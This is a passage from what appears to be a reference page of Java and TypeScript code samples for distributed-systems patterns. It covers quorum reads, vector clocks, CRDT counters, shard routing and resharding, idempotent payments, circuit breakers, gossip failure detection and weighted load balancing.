     * The quorum overlap guarantees at least one replica has the latest write.
     */
    public ReadResult<T> read(String key) {
        List<CompletableFuture<VersionedValue<T>>> futures = replicas.stream()
            .map(replica -> CompletableFuture.supplyAsync(() -> replica.read(key)))
            .collect(Collectors.toList());

        List<VersionedValue<T>> responses = new ArrayList<>();
        int failures = 0;

        for (CompletableFuture<VersionedValue<T>> future : futures) {
            try {
                VersionedValue<T> result = future.get(5, TimeUnit.SECONDS);
                if (result != null) {
                    responses.add(result);
                    if (responses.size() >= readQuorum) {
                        break;
                    }
                } else {
                    failures++;
                }
            } catch (Exception e) {
                failures++;
            }
            if (failures > replicas.size() - readQuorum) {
                return ReadResult.failure("Cannot reach read quorum");
            }
        }

        // Return the value with the highest version (last-write-wins)
        VersionedValue<T> latest = responses.stream()
            .max(Comparator.comparingLong(VersionedValue::getVersion))
            .orElse(null);

        // Trigger read repair: update stale replicas asynchronously
        if (latest != null) {
            triggerReadRepair(key, latest, responses);
        }

        return latest != null
            ? ReadResult.success(latest.getValue(), latest.getVersion())
            : ReadResult.notFound();
    }

    private void triggerReadRepair(String key, VersionedValue<T> latest,
                                    List<VersionedValue<T>> responses) {
        CompletableFuture.runAsync(() -> {
            for (ReplicaClient<T> replica : replicas) {
                // Send latest value to replicas that returned stale data
                replica.repair(key, latest);
            }
        });
    }
}

Vector Clock Implementation for Causal Ordering /**
 * Vector clock implementation for tracking causal relationships
 * between events in a distributed system.
 */
class VectorClock {
  private clock: Map<string, number>;

  constructor(nodeId?: string) {
    this.clock = new Map();
    if (nodeId) {
      this.clock.set(nodeId, 0);
    }
  }

  /**
   * Increment this node's counter (local event occurred)
   */
  increment(nodeId: string): VectorClock {
    const newClock = new VectorClock();
    newClock.clock = new Map(this.clock);
    newClock.clock.set(nodeId, (newClock.clock.get(nodeId) || 0) + 1);
    return newClock;
  }

  /**
   * Merge with another vector clock (message received).
   * Take element-wise maximum, then increment local counter.
   */
  merge(other: VectorClock, localNodeId: string): VectorClock {
    const merged = new VectorClock();

    // Combine all known nodes
    const allNodes = new Set([...this.clock.keys(), ...other.clock.keys()]);

    for (const node of allNodes) {
      const localVal = this.clock.get(node) || 0;
      const remoteVal = other.clock.get(node) || 0;
      merged.clock.set(node, Math.max(localVal, remoteVal));
    }

    // Increment local counter for the receive event
    merged.clock.set(localNodeId, (merged.clock.get(localNodeId) || 0) + 1);
    return merged;
  }

  /**
   * Determine causal relationship between two vector clocks.
   * Returns: 'before', 'after', 'concurrent', or 'equal'
   */
  compare(other: VectorClock): 'before' | 'after' | 'concurrent' | 'equal' {
    let thisBeforeOther = false;
    let otherBeforeThis = false;

    const allNodes = new Set([...this.clock.keys(), ...other.clock.keys()]);

    for (const node of allNodes) {
      const thisVal = this.clock.get(node) || 0;
      const otherVal = other.clock.get(node) || 0;

      if (thisVal < otherVal) thisBeforeOther = true;
      if (thisVal > otherVal) otherBeforeThis = true;
    }

    if (!thisBeforeOther && !otherBeforeThis) return 'equal';
    if (thisBeforeOther && !otherBeforeThis) return 'before';
    if (!thisBeforeOther && otherBeforeThis) return 'after';
    return 'concurrent'; // Both have elements greater than the other
  }

  toString(): string {
    const entries = [...this.clock.entries()]
      .sort(([a], [b]) => a.localeCompare(b))
      .map(([node, count]) => `${node}:${count}`);
    return `[${entries.join(', ')}]`;
  }
}

// Usage: Detecting conflicts in a distributed key-value store
class CausalKVStore {
  private store: Map<string, { value: unknown; clock: VectorClock }[]> = new Map();
  private nodeId: string;
  private localClock: VectorClock;

  constructor(nodeId: string) {
    this.nodeId = nodeId;
    this.localClock = new VectorClock(nodeId);
  }

  put(key: string, value: unknown): VectorClock {
    this.localClock = this.localClock.increment(this.nodeId);
    const existing = this.store.get(key) || [];

    // Remove entries that are causally before the new write
    const concurrent = existing.filter(
      entry => entry.clock.compare(this.localClock) === 'concurrent'
    );

    // Store new value alongside any concurrent versions (siblings)
    concurrent.push({ value, clock: this.localClock });
    this.store.set(key, concurrent);

    return this.localClock;
  }

  get(key: string): { value: unknown; clock: VectorClock }[] {
    return this.store.get(key) || [];
    // Multiple entries = conflict (concurrent writes)
    // Application must resolve conflicts
  }
}

CRDT: G-Counter (Grow-Only Counter) /**
 * G-Counter: a CRDT that supports increment operations.
 * Each node maintains its own counter. The global value is the sum of all node counters.
 * Merge takes the element-wise maximum, guaranteeing convergence without coordination.
 */
public class GCounter {
    private final String nodeId;
    private final Map<String, Long> counters;

    public GCounter(String nodeId) {
        this.nodeId = nodeId;
        this.counters = new ConcurrentHashMap<>();
        this.counters.put(nodeId, 0L);
    }

    private GCounter(String nodeId, Map<String, Long> counters) {
        this.nodeId = nodeId;
        this.counters = new ConcurrentHashMap<>(counters);
    }

    /** Increment this node's counter */
    public void increment() {
        counters.merge(nodeId, 1L, Long::sum);
    }

    /** Get the global counter value (sum of all nodes) */
    public long value() {
        return counters.values().stream().mapToLong(Long::longValue).sum();
    }

    /**
     * Merge with another G-Counter replica.
     * Takes element-wise maximum — this is commutative, associative, and idempotent,
     * guaranteeing convergence regardless of message ordering or duplication.
     */
    public GCounter merge(GCounter other) {
        Map<String, Long> merged = new HashMap<>(this.counters);
        for (Map.Entry<String, Long> entry : other.counters.entrySet()) {
            merged.merge(entry.getKey(), entry.getValue(), Math::max);
        }
        return new GCounter(this.nodeId, merged);
    }

    /**
     * Compare for convergence: this counter dominates other if all entries >= other's entries
     */
    public boolean dominates(GCounter other) {
        for (Map.Entry<String, Long> entry : other.counters.entrySet()) {
            long thisVal = this.counters.getOrDefault(entry.getKey(), 0L);
            if (thisVal < entry.getValue()) return false;
        }
        return true;
    }
}

Shard Router with Virtual Sharding /**
 * Shard router using virtual sharding for flexible resharding.
 * Maps logical shards (many) to physical shards (few), enabling
 * resharding by reassigning logical shards without moving data within a shard.
 */
public class VirtualShardRouter {
    private final int virtualShardCount; // e.g., 1024 logical shards
    private volatile Map<Integer, PhysicalShard> shardMapping; // logical -> physical
    private final ConsistentHasher hasher;

    public VirtualShardRouter(int virtualShardCount, List<PhysicalShard> physicalShards) {
        this.virtualShardCount = virtualShardCount;
        this.hasher = new ConsistentHasher();
        this.shardMapping = buildInitialMapping(virtualShardCount, physicalShards);
    }

    /**
     * Route a key to its physical shard.
     * Two-level mapping: key -> virtual shard -> physical shard
     */
    public PhysicalShard route(String shardKey) {
        int virtualShard = getVirtualShard(shardKey);
        PhysicalShard physical = shardMapping.get(virtualShard);
        if (physical == null) {
            throw new ShardRoutingException(
                "No physical shard mapped for virtual shard " + virtualShard
            );
        }
        return physical;
    }

    /**
     * Get the virtual shard for a key using consistent hashing.
     * The virtual shard count never changes, providing stable key-to-logical-shard mapping.
     */
    private int getVirtualShard(String shardKey) {
        long hash = hasher.hash(shardKey);
        return (int) (Math.abs(hash) % virtualShardCount);
    }

    /**
     * Scatter-gather query across all physical shards.
     * Used for queries that cannot be routed to a single shard.
     */
    public <T> List<T> scatterGather(
            Function<PhysicalShard, List<T>> queryExecutor,
            Comparator<T> resultOrdering,
            int limit) {

        Set<PhysicalShard> uniqueShards = new HashSet<>(shardMapping.values());

        List<CompletableFuture<List<T>>> futures = uniqueShards.stream()
            .map(shard -> CompletableFuture.supplyAsync(() -> queryExecutor.apply(shard)))
            .collect(Collectors.toList());

        // Wait for all shards to respond (with timeout)
        List<T> allResults = futures.stream()
            .map(f -> {
                try {
                    return f.get(5, TimeUnit.SECONDS);
                } catch (Exception e) {
                    throw new ShardQueryException("Shard query failed", e);
                }
            })
            .flatMap(List::stream)
            .sorted(resultOrdering)
            .limit(limit)
            .collect(Collectors.toList());

        return allResults;
    }

    /**
     * Resharding: move virtual shards from one physical shard to another.
     * This is the atomic switch after data migration is complete.
     */
    public void reassignVirtualShards(
            List<Integer> virtualShards,
            PhysicalShard newPhysicalShard) {

        Map<Integer, PhysicalShard> newMapping = new HashMap<>(shardMapping);
        for (int vs : virtualShards) {
            newMapping.put(vs, newPhysicalShard);
        }
        // Atomic swap of the mapping (volatile write)
        this.shardMapping = Collections.unmodifiableMap(newMapping);
    }

    private Map<Integer, PhysicalShard> buildInitialMapping(
            int virtualCount, List<PhysicalShard> physical) {
        Map<Integer, PhysicalShard> mapping = new HashMap<>();
        for (int i = 0; i < virtualCount; i++) {
            // Distribute virtual shards evenly across physical shards
            PhysicalShard target = physical.get(i % physical.size());
            mapping.put(i, target);
        }
        return Collections.unmodifiableMap(mapping);
    }
}

Online Resharding with Dual-Write Strategy /**
 * Online resharding manager that migrates data between shards
 * without downtime using a dual-write strategy.
 *
 * Phases:
 * 1. DUAL_WRITE: Write to both old and new shard
 * 2. BACKFILL: Copy historical data from old to new shard
 * 3. VERIFY: Compare data between shards for consistency
 * 4. CUTOVER: Switch reads to new shard, stop writing to old
 * 5. CLEANUP: Remove data from old shard
 */
enum ReshardPhase {
  IDLE = 'IDLE',
  DUAL_WRITE = 'DUAL_WRITE',
  BACKFILL = 'BACKFILL',
  VERIFY = 'VERIFY',
  CUTOVER = 'CUTOVER',
  CLEANUP = 'CLEANUP'
}

class OnlineResharder {
  private phase: ReshardPhase = ReshardPhase.IDLE;
  private readonly sourceShards: Map<string, DatabaseClient>;
  private readonly targetShards: Map<string, DatabaseClient>;
  private readonly router: ShardRouter;
  private readonly metrics: ReshardMetrics;

  constructor(
    sourceShards: Map<string, DatabaseClient>,
    targetShards: Map<string, DatabaseClient>,
    router: ShardRouter
  ) {
    this.sourceShards = sourceShards;
    this.targetShards = targetShards;
    this.router = router;
    this.metrics = new ReshardMetrics();
  }

  /**
   * Write operation during resharding.
   * In DUAL_WRITE phase, writes go to both source and target.
   */
  async write(key: string, data: Record<string, unknown>): Promise<void> {
    const sourceShard = this.router.routeSource(key);
    const targetShard = this.router.routeTarget(key);

    switch (this.phase) {
      case ReshardPhase.IDLE:
        // Normal operation: write to source only
        await this.sourceShards.get(sourceShard)!.write(key, data);
        break;

      case ReshardPhase.DUAL_WRITE:
      case ReshardPhase.BACKFILL:
      case ReshardPhase.VERIFY:
        // Dual-write: write to both source and target
        await Promise.all([
          this.sourceShards.get(sourceShard)!.write(key, data),
          this.targetShards.get(targetShard)!.write(key, data)
        ]);
        this.metrics.dualWrites++;
        break;

      case ReshardPhase.CUTOVER:
      case ReshardPhase.CLEANUP:
        // Post-cutover: write to target only
        await this.targetShards.get(targetShard)!.write(key, data);
        break;
    }
  }

  /**
   * Read operation during resharding.
   * Reads from source until cutover, then from target.
   */
  async read(key: string): Promise<Record<string, unknown> | null> {
    if (this.phase === ReshardPhase.CUTOVER || this.phase === ReshardPhase.CLEANUP) {
      const targetShard = this.router.routeTarget(key);
      return this.targetShards.get(targetShard)!.read(key);
    }

    const sourceShard = this.router.routeSource(key);
    return this.sourceShards.get(sourceShard)!.read(key);
  }

  /**
   * Backfill historical data from source to target shards.
   * Processes in batches with rate limiting to avoid overloading.
   */
  async backfill(batchSize: number = 1000, rateLimit: number = 5000): Promise<void> {
    this.phase = ReshardPhase.BACKFILL;
    let cursor: string | null = null;
    let totalMigrated = 0;

    for (const [shardId, client] of this.sourceShards) {
      do {
        const batch = await client.scan(cursor, batchSize);
        cursor = batch.nextCursor;

        for (const record of batch.records) {
          const targetShard = this.router.routeTarget(record.key);
          const targetClient = this.targetShards.get(targetShard)!;

          // Only copy if not already present (dual-write may have written it)
          const existing = await targetClient.read(record.key);
          if (!existing || existing.version < record.version) {
            await targetClient.write(record.key, record.data);
            totalMigrated++;
          }

          // Rate limiting
          if (totalMigrated % rateLimit === 0) {
            await this.sleep(1000); // 1 second pause every rateLimit records
          }
        }

        this.metrics.backfilledRecords = totalMigrated;
      } while (cursor !== null);
    }
  }

  /**
   * Verify data consistency between source and target shards.
   * Samples records and compares values.
   */
  async verify(sampleRate: number = 0.01): Promise<VerificationResult> {
    this.phase = ReshardPhase.VERIFY;
    let checked = 0;
    let mismatches = 0;

    for (const [shardId, client] of this.sourceShards) {
      let cursor: string | null = null;
      do {
        const batch = await client.scan(cursor, 1000);
        cursor = batch.nextCursor;

        for (const record of batch.records) {
          if (Math.random() > sampleRate) continue;

          const targetShard = this.router.routeTarget(record.key);
          const targetRecord = await this.targetShards.get(targetShard)!.read(record.key);

          checked++;
          if (!targetRecord || !this.deepEqual(record.data, targetRecord)) {
            mismatches++;
          }
        }
      } while (cursor !== null);
    }

    return {
      checked,
      mismatches,
      mismatchRate: checked > 0 ? mismatches / checked : 0,
      passed: mismatches === 0
    };
  }

  async cutover(): Promise<void> {
    this.phase = ReshardPhase.CUTOVER;
    // Update router to use new shard mapping for reads
    this.router.activateTargetMapping();
    this.metrics.cutoverTimestamp = Date.now();
  }

  private sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  private deepEqual(a: unknown, b: unknown): boolean {
    return JSON.stringify(a) === JSON.stringify(b);
  }
}

Shard-Aware Repository Pattern /**
 * Repository that transparently routes queries to the correct shard
 * based on the entity's shard key.
 */
@Repository
public class ShardedOrderRepository {
    private final VirtualShardRouter router;
    private final JdbcTemplateFactory templateFactory;

    public ShardedOrderRepository(VirtualShardRouter router,
                                   JdbcTemplateFactory templateFactory) {
        this.router = router;
        this.templateFactory = templateFactory;
    }

    /**
     * Single-shard query: route by customer ID (shard key).
     * Most efficient — hits exactly one shard.
     */
    public List<Order> findByCustomerId(String customerId) {
        PhysicalShard shard = router.route(customerId);
        JdbcTemplate template = templateFactory.getTemplate(shard);

        return template.query(
            "SELECT * FROM orders WHERE customer_id = ? ORDER BY created_at DESC",
            new OrderRowMapper(),
            customerId
        );
    }

    /**
     * Single-shard write: route by customer ID.
     */
    public Order save(Order order) {
        PhysicalShard shard = router.route(order.getCustomerId());
        JdbcTemplate template = templateFactory.getTemplate(shard);

        template.update(
            "INSERT INTO orders (id, customer_id, total, status, created_at) " +
            "VALUES (?, ?, ?, ?, ?)",
            order.getId(),
            order.getCustomerId(),
            order.getTotal(),
            order.getStatus().name(),
            order.getCreatedAt()
        );

        return order;
    }

    /**
     * Cross-shard query: scatter-gather across all shards.
     * Used for admin queries or analytics that span all customers.
     * Significantly more expensive than single-shard queries.
     */
    public List<Order> findRecentOrders(Instant since, int limit) {
        return router.scatterGather(
            shard -> {
                JdbcTemplate template = templateFactory.getTemplate(shard);
                return template.query(
                    "SELECT * FROM orders WHERE created_at > ? " +
                    "ORDER BY created_at DESC LIMIT ?",
                    new OrderRowMapper(),
                    since,
                    limit
                );
            },
            Comparator.comparing(Order::getCreatedAt).reversed(),
            limit
        );
    }

    /**
     * Cross-shard aggregation: compute total revenue across all shards.
     * Each shard computes its partial aggregate, then results are combined.
     */
    public BigDecimal getTotalRevenue(Instant from, Instant to) {
        List<BigDecimal> partialSums = router.scatterGather(
            shard -> {
                JdbcTemplate template = templateFactory.getTemplate(shard);
                BigDecimal sum = template.queryForObject(
                    "SELECT COALESCE(SUM(total), 0) FROM orders " +
                    "WHERE created_at BETWEEN ? AND ? AND status = 'COMPLETED'",
                    BigDecimal.class,
                    from, to
                );
                return List.of(sum);
            },
            Comparator.naturalOrder(),
            Integer.MAX_VALUE
        );

        return partialSums.stream()
            .reduce(BigDecimal.ZERO, BigDecimal::add);
    }

    /**
     * Paginated cross-shard query using cursor-based pagination.
     * Each shard maintains its own cursor; the router merges results.
     */
    public PagedResult<Order> findAllPaginated(
            Map<String, String> shardCursors, int pageSize) {

        Map<String, String> newCursors = new HashMap<>();
        List<Order> allResults = new ArrayList<>();

        Set<PhysicalShard> shards = new HashSet<>(
            router.getAllPhysicalShards()
        );

        for (PhysicalShard shard : shards) {
            String cursor = shardCursors.getOrDefault(shard.getId(), "");
            JdbcTemplate template = templateFactory.getTemplate(shard);

            List<Order> shardResults = template.query(
                "SELECT * FROM orders WHERE id > ? ORDER BY id LIMIT ?",
                new OrderRowMapper(),
                cursor,
                pageSize
            );

            allResults.addAll(shardResults);
            if (!shardResults.isEmpty()) {
                newCursors.put(shard.getId(),
                    shardResults.get(shardResults.size() - 1).getId());
            }
        }

        // Sort merged results and take page size
        allResults.sort(Comparator.comparing(Order::getId));
        List<Order> page = allResults.subList(0, Math.min(pageSize, allResults.size()));

        return new PagedResult<>(page, newCursors, allResults.size() >= pageSize);
    }
}

Implementing Idempotent Operations with Idempotency Keys @Service
public class PaymentService {
    private final PaymentRepository paymentRepository;
    private final IdempotencyKeyStore idempotencyStore;
    private final PaymentGateway gateway;

    public PaymentService(PaymentRepository paymentRepository,
                          IdempotencyKeyStore idempotencyStore,
                          PaymentGateway gateway) {
        this.paymentRepository = paymentRepository;
        this.idempotencyStore = idempotencyStore;
        this.gateway = gateway;
    }

    /**
     * Process payment with idempotency guarantee.
     * If the same idempotencyKey is submitted multiple times,
     * only the first request is processed; subsequent requests
     * return the cached result.
     */
    public PaymentResult processPayment(String idempotencyKey, PaymentRequest request) {
        // Check if this request was already processed
        Optional<PaymentResult> cached = idempotencyStore.get(idempotencyKey);
        if (cached.isPresent()) {
            return cached.get(); // Return cached result for duplicate request
        }

        // Acquire a lock on the idempotency key to prevent concurrent processing
        boolean acquired = idempotencyStore.tryLock(idempotencyKey, Duration.ofSeconds(30));
        if (!acquired) {
            throw new ConcurrentRequestException(
                "Request with key " + idempotencyKey + " is already being processed"
            );
        }

        try {
            // Double-check after acquiring lock
            cached = idempotencyStore.get(idempotencyKey);
            if (cached.isPresent()) {
                return cached.get();
            }

            // Process the payment
            PaymentResult result = gateway.charge(request);
            Payment payment = new Payment(
                UUID.randomUUID().toString(),
                request.getAmount(),
                request.getCurrency(),
                result.getStatus(),
                Instant.now()
            );
            paymentRepository.save(payment);

            // Store result for future duplicate detection
            idempotencyStore.put(idempotencyKey, result, Duration.ofHours(24));
            return result;
        } finally {
            idempotencyStore.releaseLock(idempotencyKey);
        }
    }
}

Circuit Breaker Pattern Implementation enum CircuitState {
  CLOSED = 'CLOSED',     // Normal operation, requests pass through
  OPEN = 'OPEN',         // Failing, requests are rejected immediately
  HALF_OPEN = 'HALF_OPEN' // Testing if service recovered
}

interface CircuitBreakerConfig {
  failureThreshold: number;    // Number of failures before opening
  recoveryTimeout: number;     // Milliseconds before trying half-open
  successThreshold: number;    // Successes in half-open before closing
  timeout: number;             // Request timeout in milliseconds
}

class CircuitBreaker {
  private state: CircuitState = CircuitState.CLOSED;
  private failureCount = 0;
  private successCount = 0;
  private lastFailureTime = 0;
  private readonly config: CircuitBreakerConfig;

  constructor(config: CircuitBreakerConfig) {
    this.config = config;
  }

  async execute<T>(operation: () => Promise<T>): Promise<T> {
    if (this.state === CircuitState.OPEN) {
      if (Date.now() - this.lastFailureTime >= this.config.recoveryTimeout) {
        this.state = CircuitState.HALF_OPEN;
        this.successCount = 0;
      } else {
        throw new CircuitOpenError(
          `Circuit is open. Retry after ${this.config.recoveryTimeout}ms`
        );
      }
    }

    try {
      const result = await this.withTimeout(operation, this.config.timeout);
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      throw error;
    }
  }

  private onSuccess(): void {
    this.failureCount = 0;
    if (this.state === CircuitState.HALF_OPEN) {
      this.successCount++;
      if (this.successCount >= this.config.successThreshold) {
        this.state = CircuitState.CLOSED;
      }
    }
  }

  private onFailure(): void {
    this.failureCount++;
    this.lastFailureTime = Date.now();
    if (this.failureCount >= this.config.failureThreshold) {
      this.state = CircuitState.OPEN;
    }
  }

  private withTimeout<T>(operation: () => Promise<T>, ms: number): Promise<T> {
    return Promise.race([
      operation(),
      new Promise<never>((_, reject) =>
        setTimeout(() => reject(new TimeoutError(`Operation timed out after ${ms}ms`)), ms)
      )
    ]);
  }

  getState(): CircuitState {
    return this.state;
  }
}

// Usage
const breaker = new CircuitBreaker({
  failureThreshold: 5,
  recoveryTimeout: 30000,
  successThreshold: 3,
  timeout: 5000
});

async function callExternalService(userId: string): Promise<UserData> {
  return breaker.execute(async () => {
    const response = await fetch(`https://api.example.com/users/${userId}`);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return response.json();
  });
}

Gossip Protocol for Failure Detection public class GossipFailureDetector {
    private final Map<String, NodeState> membershipList = new ConcurrentHashMap<>();
    private final String selfId;
    private final int gossipInterval;  // milliseconds
    private final int suspicionTimeout; // milliseconds
    private final Random random = new Random();

    public GossipFailureDetector(String selfId, int gossipInterval, int suspicionTimeout) {
        this.selfId = selfId;
        this.gossipInterval = gossipInterval;
        this.suspicionTimeout = suspicionTimeout;
        membershipList.put(selfId, new NodeState(selfId, 0, NodeStatus.ALIVE, Instant.now()));
    }

    /**
     * Periodically called to gossip with a random peer.
     * Sends our membership list and merges the response.
     */
    public void gossipRound() {
        // Increment own heartbeat
        NodeState self = membershipList.get(selfId);
        self.incrementHeartbeat();

        // Select random peer to gossip with
        List<String> peers = membershipList.keySet().stream()
            .filter(id -> !id.equals(selfId))
            .filter(id -> membershipList.get(id).getStatus() != NodeStatus.DEAD)
            .collect(Collectors.toList());

        if (peers.isEmpty()) return;

        String target = peers.get(random.nextInt(peers.size()));
        NodeState targetState = membershipList.get(target);

        // Send gossip message (in production, this would be a network call)
        GossipMessage message = new GossipMessage(selfId, new HashMap<>(membershipList));
        GossipMessage response = sendGossip(targetState.getAddress(), message);

        // Merge received membership list
        if (response != null) {
            mergeMembershipList(response.getMembershipList());
        }

        // Check for suspected/dead nodes
        detectFailures();
    }

    private void mergeMembershipList(Map<String, NodeState> received) {
        for (Map.Entry<String, NodeState> entry : received.entrySet()) {
            String nodeId = entry.getKey();
            NodeState remoteState = entry.getValue();
            NodeState localState = membershipList.get(nodeId);

            if (localState == null) {
                // New node discovered
                membershipList.put(nodeId, remoteState);
            } else if (remoteState.getHeartbeat() > localState.getHeartbeat()) {
                // Remote has newer information
                localState.updateFrom(remoteState);
            }
        }
    }

    private void detectFailures() {
        Instant now = Instant.now();
        for (Map.Entry<String, NodeState> entry : membershipList.entrySet()) {
            if (entry.getKey().equals(selfId)) continue;

            NodeState state = entry.getValue();
            Duration sinceLastUpdate = Duration.between(state.getLastUpdated(), now);

            if (sinceLastUpdate.toMillis() > suspicionTimeout * 2) {
                state.setStatus(NodeStatus.DEAD);
            } else if (sinceLastUpdate.toMillis() > suspicionTimeout) {
                state.setStatus(NodeStatus.SUSPECTED);
            }
        }
    }
}

Weighted Round Robin Load Balancer public class WeightedRoundRobinBalancer {
    private final List<WeightedBackend> backends;
    private final AtomicInteger currentIndex = new AtomicInteger(0);
    private final AtomicInteger currentWeight = new AtomicInteger(0);
    private final int maxWeight;
    private final int gcdWeight;

    public WeightedRoundRobinBalancer(List<WeightedBackend> backends) {
        this.backends = new ArrayList<>(backends);
        this.maxWeight = backends.stream()
            .mapToInt(WeightedBackend::getWeight)
            .max()
            .orElse(1);
        this.gcdWeight = computeGcd(backends.stream()
            .mapToInt(WeightedBackend::getWeight)
            .toArray());
    }

    /**
     * Select next backend using weighted round-robin algorithm.
     * Backends with higher weights receive proportionally more requests.
     * A backend with weight 3 receives 3x the traffic of weight 1.
     */
    public synchronized Backend nextBackend() {
        List<WeightedBackend> healthy = backends.stream()
            .filter(WeightedBackend::isHealthy)
            .collect(Collectors.toList());

        if (healthy.isEmpty()) {
            throw new NoHealthyBackendException("All backends are unhealthy");
        }

        while (true) {
            int index = currentIndex.get() % healthy.size();

            if (index == 0) {
                int weight = currentWeight.addAndGet(-gcdWeight);
                if (weight <= 0) {
                    currentWeight.set(maxWeight);
                    weight = maxWeight;
                }
            }

            WeightedBackend candidate = healthy.get(index);
            currentIndex.incrementAndGet();

            if (candidate.getWeight() >= currentWeight.get()) {
                return candidate.getBackend();
            }
        }
    }

    private int computeGcd(int[] values) {
        int result = values[0];
        for (int i = 1; i < values.length; i++) {
            result = gcd(result, values[i]);
        }
        return result;
    }

    private int gcd(int a, int b) {
        while (b != 0) {
            int temp = b;
            b = a % b;
            a = temp;
        }
        return a;
    }
}

public class WeightedBackend {
    private final Backend backend;
    private final int weight;
    private volatile boolean healthy = true;
    private volatile long lastHealthCheck;

    public WeightedBackend(Backend backend, int weight) {
        this.backend = backend;
